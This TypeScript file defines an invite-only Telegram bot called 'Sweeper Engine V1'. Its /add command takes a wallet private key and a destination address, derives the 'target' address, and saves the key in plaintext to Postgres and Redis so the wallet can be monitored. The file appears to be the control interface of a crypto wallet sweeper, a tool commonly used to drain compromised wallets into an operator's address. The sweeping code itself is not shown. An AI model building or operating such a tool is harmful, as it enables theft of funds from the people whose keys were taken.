import { Telegraf } from 'telegraf';
import { privateKeyToAccount } from 'viem/accounts';
import { inviteOnlyGuard, adminGuard } from './middleware';
import { mainDashboardKeyboard, adminPanelKeyboard } from './keyboards';
import { addSweepTarget } from '../engine/storage';

export const setupBot = (token: string) => {
    const bot = new Telegraf(token);

    bot.catch((err, ctx) => {
        console.error(`[Bot Error] for ${ctx.updateType}:`, err);
    });

    bot.use(inviteOnlyGuard);

    bot.start(async (ctx) => {
        await ctx.reply(
            "⚡️ *Sweeper Engine V1*\n\nEngine is online. Zero-latency routing active.", 
            { parse_mode: 'Markdown', ...mainDashboardKeyboard }
        );
    });

    bot.command('admin', adminGuard, async (ctx) => {
        await ctx.reply("🛡 *Admin Control Panel*", { 
            parse_mode: 'Markdown', 
            ...adminPanelKeyboard 
        });
    });

    // Command to securely add a wallet: /add <private_key> <destination_address>
    bot.command('add', async (ctx) => {
        const userId = ctx.from?.id;
        const messageText = ctx.message.text;
        const parts = messageText.split(' ');

        if (parts.length !== 3) {
            return ctx.reply("⚠️ Format: `/add <private_key> <destination_address>`", { parse_mode: 'Markdown' });
        }

        const rawPrivateKey = parts[1];
        const destinationAddress = parts[2];

        // Format private key correctly for viem
        const privateKey = rawPrivateKey.startsWith('0x') ? rawPrivateKey : `0x${rawPrivateKey}`;

        try {
            // Derive the target address automatically
            const account = privateKeyToAccount(privateKey as `0x${string}`);
            const targetAddress = account.address;

            // Save to Postgres and Redis
            await addSweepTarget(userId, targetAddress, destinationAddress, privateKey);

            await ctx.reply(`✅ *Wallet Added Successfully*\n\n🎯 Target: \`${targetAddress}\`\n🏦 Destination: \`${destinationAddress}\`\n\nMonitoring is now active.`, { parse_mode: 'Markdown' });
            
            // Instantly delete the user's message containing the private key for security
            await ctx.deleteMessage(ctx.message.message_id).catch(() => console.log("Failed to delete message. Bot needs admin rights in a group, or cannot delete in DMs if older than 48h."));
            
        } catch (error) {
            console.error(error);
            await ctx.reply("❌ Invalid private key or address format.");
        }
    });

    bot.action('ADD_TARGET', async (ctx) => {
        await ctx.answerCbQuery();
        await ctx.reply("To add a wallet, send this command:\n\n`/add <private_key> <destination_address>`", { parse_mode: 'Markdown' });
    });

    return bot;
};
